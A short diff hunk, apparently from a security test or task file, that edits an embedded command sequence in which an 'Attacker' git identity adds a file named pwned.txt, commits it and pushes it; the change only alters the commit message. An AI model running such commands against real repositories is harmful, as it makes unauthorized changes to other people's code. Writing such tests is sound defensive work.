@@ -33,7 +33,7 @@
                                             git config --global user.name "Attacker";
                                             git config --global user.email "attacker@example.com";
                                             git add pwned.txt;
-                                            git commit -m "pwned";
+                                            git commit -m "pwned hacked";
                                             git push;
                                         </argument>
                                     </arguments>
